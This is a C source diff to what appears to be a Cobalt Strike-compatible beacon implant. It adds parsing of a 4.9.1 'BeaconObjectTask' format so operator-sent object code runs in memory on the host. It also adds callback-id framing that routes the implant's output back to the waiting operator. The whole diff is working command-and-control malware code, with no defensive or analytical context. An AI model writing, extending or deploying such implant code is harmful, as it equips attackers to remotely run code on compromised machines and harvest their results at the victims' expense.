@@ -87,7 +87,30 @@ static BOOL use_token_a(HANDLE token) {
 	return result;
 }
 
+/* callback id captured from an official BeaconObjectTask (4.9.1
+ * beacons.task_ipconfig and friends): while non-zero, object output is sent
+ * as type-22 task-callback frames ([u32 LE id][data]) so the TS routes it to
+ * the waiting operator callback instead of the beacon console */
+static int g_obj_callback = 0;
+
 static void postmsg(int type, char * msg, int len) {
+	if (g_obj_callback != 0) {
+		char * blob = (char *)malloc(len + 4);
+		int    id   = g_obj_callback;
+		if (blob == NULL) {
+			command_shell_callback(msg, len, type);
+			return;
+		}
+		blob[0] = (char)(id & 0xFF);
+		blob[1] = (char)((id >> 8) & 0xFF);
+		blob[2] = (char)((id >> 16) & 0xFF);
+		blob[3] = (char)((id >> 24) & 0xFF);
+		memcpy(blob + 4, msg, len);
+		command_shell_callback(blob, len + 4, 22); /* 22 = task-callback output */
+		memset(blob, 0, len + 4);
+		free(blob);
+		return;
+	}
 	command_shell_callback(msg, len, type);
 }
 
@@ -1444,6 +1467,57 @@ void command_inline_execute_object(char * buffer, int length) {
 	datap_buffer args;
 	int prefix_len;
 
+	/* --- 4.9.1 official BeaconObjectTask shape (beacons.task_ipconfig
+	 * and friends): [int entry][len+code][len+rdata][len+data]
+	 * [len+relocs][len+args4=callback id BE]. Discriminate by strict
+	 * full-consumption validation; fall through to BOF/PE otherwise. --- */
+	{
+		datap        p;
+		datap_buffer c491, rd491, da491, rl491, ar491;
+		DWORD        entry491;
+		BOOL         ok491 = TRUE;
+
+		data_init(&p, buffer, length);
+		entry491 = data_int(&p);
+		c491 = data_extract(&p);
+		rd491 = data_extract(&p);
+		da491 = data_extract(&p);
+		rl491 = data_extract(&p);
+		ar491 = data_extract(&p);
+		if (p.length != 0) ok491 = FALSE;
+		if (ar491.length != 4) ok491 = FALSE;
+		if (c491.length == 0 || (DWORD)c491.length <= entry491) ok491 = FALSE;
+		if (rd491.length == 0 || rl491.length == 0) ok491 = FALSE;
+
+		if (ok491) {
+			formatp rep;
+			bformat_init(&rep, c491.length + rd491.length + da491.length
+			                   + rl491.length + 128);
+			bformat_int(&rep, 4096); /* bssSize (official task omits .bss) */
+			bformat_copy(&rep, (char *)c491.buffer, c491.length);
+			bformat_copy(&rep, (char *)rd491.buffer, rd491.length);
+			bformat_copy(&rep, (char *)da491.buffer, da491.length);
+			bformat_int(&rep, 0);    /* xdata: empty */
+			bformat_int(&rep, 0);    /* pdata: empty */
+			bformat_copy(&rep, (char *)rl491.buffer, rl491.length);
+			bformat_int(&rep, entry491);
+			bformat_copy(&rep, (char *)ar491.buffer, ar491.length);
+
+			/* args blob = 4-byte callback id (BE, CommandBuilder.addInt) */
+			g_obj_callback = ((DWORD)ar491.buffer[0] << 24)
+			               | ((DWORD)ar491.buffer[1] << 16)
+			               | ((DWORD)ar491.buffer[2] << 8)
+			               | (DWORD)ar491.buffer[3];
+
+			command_inline_execute_object_parsed(rep.buffer, rep.length,
+			                                     entry491, ar491.buffer,
+			                                     ar491.length, 0);
+			g_obj_callback = 0;
+			bformat_free(&rep);
+			return;
+		}
+
+	/* --- legacy BOF / BOFPE shapes --- */
 	data_init(&parser, buffer, length);
 	prefix_len = data_int(&parser);  /* bssSize (BOF) / BOFPE_MAGIC (PE) */
 	code = data_extract(&parser);    /* code (BOF) / whole PE image (PE) */
